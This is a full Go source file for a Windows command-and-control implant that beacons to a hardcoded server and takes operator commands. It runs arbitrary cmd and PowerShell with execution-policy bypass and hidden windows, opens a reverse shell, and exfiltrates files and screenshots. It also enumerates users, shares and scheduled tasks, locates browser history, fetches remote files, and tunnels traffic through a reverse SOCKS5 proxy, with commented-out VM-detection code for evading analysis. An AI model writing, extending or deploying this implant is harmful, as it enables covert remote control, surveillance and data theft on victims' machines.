package main

import (
    "bufio"
    "bytes"
    "crypto/tls"
    "crypto/rand"
    "context"
    "encoding/base64"
    "encoding/json"
    "encoding/binary"
    "encoding/hex"
    "fmt"
    "github.com/kbinani/screenshot"
    "image/png"
    "io/ioutil"
    "log"
     mrand "math/rand"
    "net"
    "net/http"
    "net/url"
    "os/exec"
    "os"
    "os/user"
    "path/filepath"
    "io"
    "strings"
    "sync"
    "syscall"
    "time"
    "unicode"
    "github.com/StackExchange/wmi"
)

var (
    proxyActive   bool
    proxyStopChan chan struct{}
    proxyLock     sync.Mutex
    agentID       string
)

var (
    mu               sync.Mutex
    isCommandRunning bool
    serverURL        = "http://192.168.56.101:5000"
    bearerToken      = "Azerty112345678"
)

var (
    beaconMin = 10
    beaconMax = 30
    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
    tlsInsecureSkipVerify = true // set to false in prod if you want real cert check
)


type Command struct {
    ID  string `json:"id"`
    Cmd string `json:"cmd"`
}

type CommandResult struct {
    ID       string `json:"id"`
    Result   string `json:"result"`
    FileName string `json:"fileName,omitempty"`
}

func main() {
    log.Println("Agent started. Waiting for commands...")
    agentID = getAgentID()
    log.Printf("[*] Generated ephemeral Agent ID: %s", agentID)
/*
    log.Println("Agent started. Checking VM status...")


        // Perform VM detection
        vmRes := DetectVM()


// Build detailed VM detection result
        vmResult := fmt.Sprintf(
                "VM Detection Results:\n"+
                "- Hypervisor Bit Set: %v\n"+
                "- BIOS Vendor Indicates VM: %v\n"+
                "- MAC Address Indicates VM: %v\n"+
                "- Timing Anomaly Detected: %v\n"+
                "- Registry Artifacts Found: %v\n"+
                "--------------------------------\n"+
                "Likely Running in VM: %v\n",
                vmRes.HypervisorBit,
                vmRes.BIOSVendorMatch,
                vmRes.MACOUI,
                vmRes.TimingAnomaly,
                vmRes.RegistryArtifacts,
                vmRes.LikelyVM,
        )

        sendResult(CommandResult{
                ID:     "vm_check",
                Result: vmResult,
        })

*/
go func() {
    mrand.Seed(time.Now().UnixNano())
    for {
        // use the latest values of beaconMin/beaconMax
        interval := mrand.Intn(beaconMax-beaconMin+1) + beaconMin
        time.Sleep(time.Duration(interval) * time.Second)

        mu.Lock()
        if !isCommandRunning {
            isCommandRunning = true
            mu.Unlock()

            cmd, err := fetchCommand(agentID)
            if err != nil {
                log.Printf("Error fetching command: %v", err)
                mu.Lock()
                isCommandRunning = false
                mu.Unlock()
                continue
            }
            if cmd.ID != "" {
                executeCommandAndSendResult(cmd)
            }

            mu.Lock()
            isCommandRunning = false
            mu.Unlock()
        } else {
            mu.Unlock()
        }
    }
}()
 
    select {} // Prevent the application from exiting immediately.
}

func fetchCommand(agentID string) (Command, error) {
    var cmd Command

    req, err := http.NewRequest("GET", fmt.Sprintf("%s/command", serverURL), nil)
    if err != nil {
        return cmd, err
    }

    // Add hard-coded Bearer token for authentication
    req.Header.Set("Authorization", "Bearer "+bearerToken)
    req.Header.Set("X-Agent-ID", agentID)
    req.Header.Set("User-Agent", userAgent)


    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify}, // ⚠ For local testing only
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   15 * time.Second,
    }
    resp, err := client.Do(req)
    if err != nil {
        return cmd, err
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusUnauthorized {
        log.Println("[-] Unauthorized: invalid or missing token")
        return cmd, nil
    }

    if resp.StatusCode != http.StatusOK {
        // No command available (404 or similar)
        return cmd, nil
    }

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return cmd, err
    }

    if err := json.Unmarshal(body, &cmd); err != nil {
        return cmd, err
    }

    return cmd, nil
}

func sendResult(result CommandResult) {
    jsonData, err := json.Marshal(result)
    if err != nil {
        log.Printf("Error marshalling result: %v", err)
        return
    }

    req, err := http.NewRequest("POST", fmt.Sprintf("%s/submit_result", serverURL), bytes.NewBuffer(jsonData))
    if err != nil {
        log.Printf("Failed to create HTTP request: %v", err)
        return
    }

    req.Header.Set("Authorization", "Bearer "+bearerToken)
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("X-Agent-ID", agentID) // use global variable here
    req.Header.Set("User-Agent", userAgent)


    tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: tlsInsecureSkipVerify},
    }
    client := &http.Client{
        Transport: tr,
        Timeout:   15 * time.Second,
    }
    resp, err := client.Do(req)
    if err != nil {
        log.Printf("Failed to send result: %v", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode == http.StatusUnauthorized {
        log.Println("[-] Unauthorized: invalid or missing token when sending result")
        return
    }

    if resp.StatusCode != http.StatusOK {
        body, _ := ioutil.ReadAll(resp.Body)
        log.Printf("Server returned status %s: %s", resp.Status, string(body))
    }
}


func executeCommandAndSendResult(cmd Command) {
    switch {
    case strings.HasPrefix(cmd.Cmd, "shell "):
        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
        Shell(address)
    case strings.HasPrefix(cmd.Cmd, "download "):
        tokens := strings.Split(cmd.Cmd, " ")
        if len(tokens) < 3 {
                sendResult(CommandResult{ID: cmd.ID, Result: "[-] Usage: download <source_path> <destination_name>"})
                return
        }

        // Recombine everything except the last token
        srcPath := strings.Join(tokens[1:len(tokens)-1], " ")
        dstName := tokens[len(tokens)-1]

        srcPath = strings.Trim(srcPath, "\"'")
        dstName = strings.Trim(dstName, "\"'")

        downloadFile(srcPath, dstName, cmd.ID)
    case cmd.Cmd == "screenshot":
        takeScreenshot(cmd)
    case cmd.Cmd == "list_share":
        listShare(cmd)
    case cmd.Cmd == "list_drive":
        listDrive(cmd)
    case cmd.Cmd == "whoami":
        whoami(cmd)
    case cmd.Cmd == "list_group":
            listGroup(cmd)
    case cmd.Cmd == "scheduled_task":
            listScheduledTask(cmd)
    case cmd.Cmd == "publicip":
            publicIp(cmd)
    case cmd.Cmd == "powershell":
           execPowerShellAndSendResult(cmd)
    case strings.HasPrefix(cmd.Cmd, "run_script "):
           scriptPath := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "run_script"))
           runPowerShellScript(cmd, scriptPath)
    case strings.HasPrefix(cmd.Cmd, "fetchfile "):
        parts := strings.SplitN(cmd.Cmd[len("fetchfile "):], " ", 2)
        if len(parts) == 2 {
            fetchRemoteFile(parts[0], parts[1], cmd.ID)
        } else {
            log.Println("Fetchfile command format error. Expected 'fetchfile <url> <destination_path>'.")
            sendResult(CommandResult{
                ID:     cmd.ID,
                Result: "Usage: fetchfile <url> <destination_path>",
            })
        }
    case cmd.Cmd == "browser_history":
        checkBrowserHistories(cmd)
    case cmd.Cmd == "reverse_proxy_start":
         go startReverseProxy()
         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy started."})
    case cmd.Cmd == "reverse_proxy_stop":
         stopReverseProxy()
         sendResult(CommandResult{ID: cmd.ID, Result: "[+] Reverse proxy stop signal sent."})
    case strings.HasPrefix(cmd.Cmd, "beacon "):
         updateBeaconInterval(cmd)
    default:
        executeOtherCommand(cmd)
    }
}

func Shell(address string) {
    conn, err := net.Dial("tcp", address)
    if err != nil {
        log.Printf("Failed to shell to %s: %v", address, err)
        return
    }
    defer conn.Close()

    for {
        reader := bufio.NewReader(conn)
        command, err := reader.ReadString('\n')
        if err != nil {
            log.Printf("Failed to read command: %v", err)
            break
        }

        cmd := exec.Command("cmd.exe", "/C", command)
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        output, err := cmd.CombinedOutput()
        if err != nil {
            fmt.Fprintf(conn, "Failed to execute command: %s\n", err)
            continue
        }

        conn.Write(output)
    }
}

func downloadFile(filePath, fileName, commandID string) {
    content, err := ioutil.ReadFile(filePath)
    if err != nil {
        log.Printf("Error reading file %s: %v", filePath, err)
        sendResult(CommandResult{ID: commandID, Result: fmt.Sprintf("Failed to read file: %v", err)})
        return
    }
    encodedContent := base64.StdEncoding.EncodeToString(content)
    sendResult(CommandResult{ID: commandID, Result: encodedContent, FileName: fileName})
}

func takeScreenshot(cmd Command) {
    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        log.Printf("Failed to take screenshot: %v", err)
        sendResult(CommandResult{ID: cmd.ID, Result: "Failed to take screenshot"})
        return
    }
    var buf bytes.Buffer
    if err := png.Encode(&buf, img); err != nil {
        log.Printf("Failed to encode screenshot to PNG: %v", err)
        return
    }
    timestamp := time.Now().Format("20060102-150405")
    fileName := fmt.Sprintf("screenshot-%s.png", timestamp)
    sendResult(CommandResult{
        ID:       cmd.ID,
        Result:   base64.StdEncoding.EncodeToString(buf.Bytes()),
        FileName: fileName,
    })
}

func listShare(cmd Command) {
    psCommand := "powershell.exe Get-WmiObject Win32_Share"
    output, err := exec.Command("cmd", "/C", psCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listDrive(cmd Command) {
    wmicCommand := "wmic logicaldisk get name,size"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func whoami(cmd Command) {
    wmicCommand := "whoami /all"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func listGroup(cmd Command) {
    wmicCommand := "net localgroup"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}


func listScheduledTask(cmd Command) {
    wmicCommand := "schtasks /query /fo LIST /v"
    output, err := exec.Command("cmd", "/C", wmicCommand).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func publicIp(cmd Command) {
    req, err := http.NewRequest("GET", "https://ipinfo.io/ip", nil)
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error creating request: %v", err),
        })
        return
    }

    // ✅ Set Microsoft Edge User-Agent
    req.Header.Set("User-Agent", userAgent)

    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error fetching public IP: %v", err),
        })
        return
    }
    defer resp.Body.Close()

    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: fmt.Sprintf("Error reading response: %v", err),
        })
        return
    }

    publicIP := strings.TrimSpace(string(body))
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: publicIP,
    })
}

func runPowerShellScript(cmd Command, scriptPath string) {
    command := exec.Command("powershell.exe",
        "-NoProfile",
        "-ExecutionPolicy", "Bypass",
        "-File", scriptPath,
    )
    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    output, err := command.CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }

    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func execPowerShellAndSendResult(cmd Command) {
    psCmd := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(cmd.Cmd), "powershell"))
    if psCmd == "" {
        psCmd = cmd.Cmd
    }

    command := exec.Command("powershell.exe",
        "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCmd)
    command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

    output, err := command.CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }

    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: resultText,
    })
}

func fetchRemoteFile(url, destPath string, commandID string) {
    resp, err := http.Get(url)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to fetch %s: %v", url, err),
        })
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Server returned: %s", resp.Status),
        })
        return
    }

    file, err := os.Create(destPath)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to create %s: %v", destPath, err),
        })
        return
    }
    defer file.Close()

    _, err = io.Copy(file, resp.Body)
    if err != nil {
        sendResult(CommandResult{
            ID:     commandID,
            Result: fmt.Sprintf("❌ Failed to save file: %v", err),
        })
        return
    }

    sendResult(CommandResult{
        ID:     commandID,
        Result: fmt.Sprintf("✅ File successfully fetched to %s", destPath),
    })
}

func checkBrowserHistories(cmd Command) {
        browsers := []struct {
                Name string
                PathPatterns []string
        }{
                {
                        "Chrome",
                        []string{`AppData\Local\Google\Chrome\User Data\Default\History`},
                },
                {
                        "Edge",
                        []string{`AppData\Local\Microsoft\Edge\User Data\Default\History`},
                },
                {
                        "Brave",
                        []string{`AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History`},
                },
                {
                        "Firefox",
                        []string{`AppData\Roaming\Mozilla\Firefox\Profiles`},
                },
        }

        currentUser, err := user.Current()
        if err != nil {
                sendResult(CommandResult{
                        ID:     cmd.ID,
                        Result: "Failed to get current user: " + err.Error(),
                })
                return
        }

        var resultBuilder strings.Builder

        for _, browser := range browsers {
                found := false
                if browser.Name == "Firefox" {
                        // Handle Firefox's dynamic profile folder
                        basePath := filepath.Join(currentUser.HomeDir, browser.PathPatterns[0])
                        files, err := os.ReadDir(basePath)
                        if err == nil {
                                for _, f := range files {
                                        if f.IsDir() && strings.Contains(f.Name(), ".default") {
                                                histPath := filepath.Join(basePath, f.Name(), "places.sqlite")
                                                if _, err := os.Stat(histPath); err == nil {
                                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                                        found = true
                                                        break
                                                }
                                        }
                                }
                        }
                } else {
                        for _, pattern := range browser.PathPatterns {
                                histPath := filepath.Join(currentUser.HomeDir, pattern)
                                if _, err := os.Stat(histPath); err == nil {
                                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: Yes\nHistory Path: %s\n---\n", browser.Name, histPath))
                                        found = true
                                        break
                                }
                        }
                }
                if !found {
                        resultBuilder.WriteString(fmt.Sprintf("Browser: %s\nInstalled: No or History Not Found\n---\n", browser.Name))
                }
        }

        sendResult(CommandResult{
                ID:     cmd.ID,
                Result: resultBuilder.String(),
        })
}


func executeOtherCommand(cmd Command) {
    output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
    resultText := string(output)
    if err != nil {
        resultText += "\nError: " + err.Error()
    }
    sendResult(CommandResult{ID: cmd.ID, Result: resultText})
}


type VMCheckResult struct {
        HypervisorBit bool `json:"hypervisor_bit"`
        BIOSVendorMatch bool `json:"bios_vendor_match"`
        MACOUI bool `json:"mac_oui"`
        TimingAnomaly bool `json:"timing_anomaly"`
        RegistryArtifacts bool `json:"registry_artifacts"`
        LikelyVM bool `json:"likely_vm"`
}



func DetectVM() VMCheckResult {
        res := VMCheckResult{}
        res.HypervisorBit = false // not implemented
        res.BIOSVendorMatch = checkDmiStringsWMI()
        res.MACOUI = checkMACVendor()
        res.TimingAnomaly = checkTimingAnomaly()
        res.RegistryArtifacts = false


        count := 0
        if res.HypervisorBit {
                count++
        }
        if res.BIOSVendorMatch {
                count++
        }
        if res.MACOUI {
                count++
        }
        if res.TimingAnomaly {
                count++
        }
        if res.RegistryArtifacts {
                count++
        }


        res.LikelyVM = count >= 2
        return res
}

func checkDmiStringsWMI() bool {
        type Win32_ComputerSystem struct {
                Manufacturer string
                Model        string
        }

        var sysInfo []Win32_ComputerSystem
        err := wmi.Query("SELECT Manufacturer, Model FROM Win32_ComputerSystem", &sysInfo)
        if err != nil || len(sysInfo) == 0 {
                return false
        }

        known := []string{"VMware", "VirtualBox", "Xen", "QEMU", "Microsoft", "KVM"}
        man := strings.ToLower(sysInfo[0].Manufacturer)
        model := strings.ToLower(sysInfo[0].Model)
        for _, k := range known {
                if strings.Contains(man, strings.ToLower(k)) || strings.Contains(model, strings.ToLower(k)) {
                        return true
                }
        }
        return false
}

func checkMACVendor() bool {
        vmOuis := []string{
                "00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00",
        }
        ifaces, err := net.Interfaces()
        if err != nil {
                return false
        }
        for _, iface := range ifaces {
                mac := iface.HardwareAddr.String()
                for _, prefix := range vmOuis {
                        if strings.HasPrefix(strings.ToUpper(mac), strings.ToUpper(prefix)) {
                                return true
                        }
                }
        }
        return false
}

func checkTimingAnomaly() bool {
        start := time.Now()
        for i := 0; i < 1000000; i++ {
                _ = i * i
        }
        duration := time.Since(start)
        return duration > 80*time.Millisecond
}

// handleSOCKS5 implements a minimal SOCKS5 server that resolves domains on the agent.
// It will handle multiple sequential SOCKS requests over the same TCP connection
// and uses proper half-close semantics so both sides receive the full response.
func handleSOCKS5(serverConn net.Conn) {
    defer func() {
        _ = serverConn.Close()
        log.Printf("[*] SOCKS5: connection handler exiting")
    }()

    // helper to close write side when using net.TCPConn
    closeWrite := func(c net.Conn) {
        if tcp, ok := c.(*net.TCPConn); ok {
            _ = tcp.CloseWrite()
        } else {
            _ = c.Close()
        }
    }

    // idle timeout between SOCKS handshakes -- increase if you want longer-lived idle connections
    idleTimeout := 120 * time.Second

    for {
        // ---- Greeting ----
        _ = serverConn.SetReadDeadline(time.Now().Add(idleTimeout))
        header := make([]byte, 2)
        if _, err := io.ReadFull(serverConn, header); err != nil {
            if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
                log.Printf("[-] SOCKS5: greeting read timeout/closed: %v", err)
            } else {
                log.Printf("[-] SOCKS5: greeting read failed: %v", err)
            }
            return
        }
        _ = serverConn.SetReadDeadline(time.Time{}) // clear deadline

        if header[0] != 0x05 {
            log.Printf("[-] SOCKS5: unsupported version %d", header[0])
            return
        }
        nMethods := int(header[1])
        if nMethods <= 0 || nMethods > 255 {
            log.Printf("[-] SOCKS5: invalid nMethods %d", nMethods)
            return
        }
        methods := make([]byte, nMethods)
        if _, err := io.ReadFull(serverConn, methods); err != nil {
            log.Printf("[-] SOCKS5: reading methods failed: %v", err)
            return
        }

        // reply: version 5, no authentication
        if _, err := serverConn.Write([]byte{0x05, 0x00}); err != nil {
            log.Printf("[-] SOCKS5: failed to write greeting reply: %v", err)
            return
        }

        // ---- Request ----
        headerReq := make([]byte, 4)
        if _, err := io.ReadFull(serverConn, headerReq); err != nil {
            log.Printf("[-] SOCKS5: request header read failed: %v", err)
            return
        }
        if headerReq[0] != 0x05 {
            log.Printf("[-] SOCKS5: request version mismatch %d", headerReq[0])
            return
        }
        cmd := headerReq[1]
        addrType := headerReq[3]
        if cmd != 0x01 {
            log.Printf("[-] SOCKS5: unsupported command %d", cmd)
            serverConn.Write([]byte{0x05, 0x07, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
            return
        }

        var dstHost string
        var dstPort uint16

        switch addrType {
        case 0x01: // IPv4
            addrBuf := make([]byte, 4)
            if _, err := io.ReadFull(serverConn, addrBuf); err != nil {
                log.Printf("[-] SOCKS5: failed to read IPv4 addr: %v", err)
                return
            }
            portBuf := make([]byte, 2)
            if _, err := io.ReadFull(serverConn, portBuf); err != nil {
                log.Printf("[-] SOCKS5: failed to read port: %v", err)
                return
            }
            ip := net.IPv4(addrBuf[0], addrBuf[1], addrBuf[2], addrBuf[3]).String()
            port := binary.BigEndian.Uint16(portBuf)
            dstHost = ip
            dstPort = port

        case 0x03: // Domain
            lenBuf := make([]byte, 1)
            if _, err := io.ReadFull(serverConn, lenBuf); err != nil {
                log.Printf("[-] SOCKS5: failed to read domain length: %v", err)
                return
            }
            dlen := int(lenBuf[0])
            if dlen <= 0 || dlen > 255 {
                log.Printf("[-] SOCKS5: invalid domain length %d", dlen)
                return
            }
            domBuf := make([]byte, dlen+2)
            if _, err := io.ReadFull(serverConn, domBuf); err != nil {
                log.Printf("[-] SOCKS5: failed to read domain+port: %v", err)
                return
            }
            domain := string(domBuf[:dlen])
            port := binary.BigEndian.Uint16(domBuf[dlen : dlen+2])

            // Agent-side DNS resolution: prefer IPv4 then IPv6
            var chosenIP net.IP
            ctx := context.Background()

            if ips4, err4 := net.DefaultResolver.LookupIP(ctx, "ip4", domain); err4 == nil && len(ips4) > 0 {
                for _, ip := range ips4 {
                    if ip == nil || ip.IsUnspecified() || ip.IsMulticast() {
                        continue
                    }
                    chosenIP = ip
                    break
                }
            }

            if chosenIP == nil {
                if ips6, err6 := net.DefaultResolver.LookupIP(ctx, "ip6", domain); err6 == nil && len(ips6) > 0 {
                    for _, ip := range ips6 {
                        if ip == nil || ip.IsUnspecified() || ip.IsMulticast() {
                            continue
                        }
                        chosenIP = ip
                        break
                    }
                }
            }

            if chosenIP == nil {
                log.Printf("[-] SOCKS5: DNS lookup returned no usable IP for %s", domain)
                serverConn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
                return
            }

            dstHost = chosenIP.String()
            dstPort = port
            log.Printf("[*] SOCKS5: resolved %s -> %s", domain, dstHost)

        default:
            log.Printf("[-] SOCKS5: unsupported addrType %d", addrType)
            serverConn.Write([]byte{0x05, 0x08, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
            return
        }

        // prepare address (use bracketed IPv6 when necessary)
        var dstAddr string
        if ip := net.ParseIP(dstHost); ip != nil && ip.To4() == nil {
            dstAddr = fmt.Sprintf("[%s]:%d", dstHost, dstPort)
        } else {
            dstAddr = fmt.Sprintf("%s:%d", dstHost, dstPort)
        }

        // Connect to target
        log.Printf("[*] SOCKS5 connect request → %s", dstAddr)
        targetConn, err := net.DialTimeout("tcp", dstAddr, 15*time.Second)
        if err != nil {
            log.Printf("[-] SOCKS5: connect to %s failed: %v", dstAddr, err)
            serverConn.Write([]byte{0x05, 0x05, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
            // keep serverConn open to accept future requests
            continue
        }

        // success reply
        if _, err := serverConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0}); err != nil {
            log.Printf("[-] SOCKS5: failed to write success reply: %v", err)
            targetConn.Close()
            return
        }
        log.Printf("[+] SOCKS5: connected → %s", dstAddr)

        // ---- Relay traffic robustly with proper half-close ----
        done := make(chan struct{}, 2)

        go func() {
            _, _ = io.Copy(targetConn, serverConn) // client -> target
            closeWrite(targetConn)
            done <- struct{}{}
        }()

        go func() {
            _, _ = io.Copy(serverConn, targetConn) // target -> client
            // do not forcibly close serverConn here; outer defer will close after loop exit if needed
            done <- struct{}{}
        }()

        // wait both directions to finish
        <-done
        <-done

        log.Printf("[*] SOCKS5: session closed for %s", dstAddr)
        // loop back and accept next SOCKS handshake on same serverConn
    }
}

func startReverseProxy() {
    proxyLock.Lock()
    if proxyActive {
        log.Println("[!]  proxy already active.")
        proxyLock.Unlock()
        return
    }
    proxyActive = true
    proxyStopChan = make(chan struct{})
    proxyLock.Unlock()

    parsed, err := url.Parse(serverURL)
    if err != nil {
        log.Printf("[-] proxy: cannot parse serverURL: %v", err)
        return
    }
    host := parsed.Host
    if strings.Contains(host, ":") {
        host = strings.Split(host, ":")[0]
    }
    remoteAddr := net.JoinHostPort(host, "5555")

    for {
        select {
        case <-proxyStopChan:
            log.Println("[*] proxy: stop signal received.")
            proxyLock.Lock()
            proxyActive = false
            proxyLock.Unlock()
            log.Println("[+] proxy: stopped.")
            return
        default:
            log.Printf("[*] proxy: connecting to %s ...", remoteAddr)
            conn, err := net.Dial("tcp", remoteAddr)
            if err != nil {
                log.Printf("[-] proxy: failed to connect: %v", err)
                time.Sleep(5 * time.Second)
                continue
            }
            log.Printf("[+] proxy: connected to %s", remoteAddr)
            // This handles multiple SOCKS requests for the life of this connection.
            handleSOCKS5(conn)
            log.Printf("[*] proxy: session closed, reconnecting...")
            conn.Close()
            time.Sleep(2 * time.Second)
        }
    }
}

func stopReverseProxy() {
    proxyLock.Lock()
    defer proxyLock.Unlock()
    if proxyActive && proxyStopChan != nil {
        close(proxyStopChan)
    } else {
        log.Println("[-] proxy: not active.")
    }
}

// getAgentID builds an ephemeral ID such as "DESKTOP-123abc456def".
func getAgentID() string {
    host, _ := os.Hostname()
    host = strings.Split(host, ".")[0]
    host = sanitizeHost(host)
    if len(host) > 15 {
        host = host[:15]
    }
    randBytes := make([]byte, 8)
    if _, err := rand.Read(randBytes); err != nil {
        return host // fallback
    }
    suffix := hex.EncodeToString(randBytes)
    return fmt.Sprintf("%s_%s", host, suffix)
}

// sanitizeHost keeps only safe ASCII chars.
func sanitizeHost(s string) string {
    var b strings.Builder
    for _, r := range s {
        if unicode.IsLetter(r) || unicode.IsDigit(r) || r == '-' || r == '_' {
            b.WriteRune(unicode.ToLower(r))
        }
    }
    if b.Len() == 0 {
        return "host"
    }
    return b.String()
}

func updateBeaconInterval(cmd Command) {
    args := strings.TrimPrefix(cmd.Cmd, "beacon ")
    parts := strings.Fields(args)
    var newMin, newMax int
    for _, p := range parts {
        if strings.HasPrefix(p, "min=") {
            fmt.Sscanf(p, "min=%d", &newMin)
        } else if strings.HasPrefix(p, "max=") {
            fmt.Sscanf(p, "max=%d", &newMax)
        }
    }

    if newMin <= 0 || newMax <= 0 || newMin >= newMax {
        sendResult(CommandResult{
            ID:     cmd.ID,
            Result: "❌ Invalid beacon range. Use: beacon min=10 max=30 (min < max)",
        })
        return
    }

    beaconMin = newMin
    beaconMax = newMax
    sendResult(CommandResult{
        ID:     cmd.ID,
        Result: fmt.Sprintf("✅ Beacon interval updated: min=%d, max=%d", beaconMin, beaconMax),
    })
}
